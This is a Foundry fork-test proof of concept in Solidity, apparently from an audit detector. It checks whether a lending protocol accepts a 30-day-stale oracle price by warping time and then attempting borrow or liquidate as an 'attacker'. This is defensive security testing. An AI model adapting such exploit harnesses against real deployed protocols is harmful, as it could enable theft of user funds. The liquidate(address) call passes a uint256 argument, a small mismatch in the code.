// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Stale oracle price accepted
/// @notice Detector: oracle-staleness. latestRoundData() is consumed without
///         checking updatedAt / answeredInRound, so a feed that has stopped
///         updating still prices collateral.
/// @dev FORK-ONLY. Reference class: the price plumbing behind the 2021-2024
///      oracle losses (Mango, BonqDAO, Venus). A halted, deprecated or
///      sequencer-stalled feed keeps returning its last answer.
///      Copy to foundry/test/Exploit.t.sol and run via scripts/run-fork-poc.sh.
///      The harness warps far past any plausible heartbeat and then borrows:
///      if the borrow succeeds at the stale price, the protocol never asked
///      when that price was produced. The verdict is the borrow succeeding,
///      not the oracle returning.
contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_stalePriceStillPricesCollateral() public {
        address attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);

        // Move far past any heartbeat. On a real fork the aggregator's stored
        // round is now ancient, but its latestRoundData() answer is unchanged.
        vm.warp(block.timestamp + 30 days);
        vm.roll(block.number + 200_000);

        bool accepted = false;
        string[2] memory shapes = ["borrow(uint256)", "liquidate(address)"];
        for (uint256 i = 0; i < shapes.length && !accepted; ++i) {
            vm.prank(attacker);
            (bool ok,) = target.call(abi.encodeWithSignature(shapes[i], uint256(1 ether)));
            console.log("stale-price attempt via", shapes[i], ok);
            accepted = ok;
        }

        console.log("warped to timestamp:", block.timestamp);

        assertTrue(
            accepted,
            "the protocol rejected the borrow at a 30-day-stale price. Tried borrow(uint256) and liquidate(address) after warping 30 days and 200,000 blocks. This is NOT a failure of the harness: a protocol that reverts on a stale feed is SAFE and the finding should be withdrawn. If the entry has another name, adapt the shape and re-run."
        );
    }
}
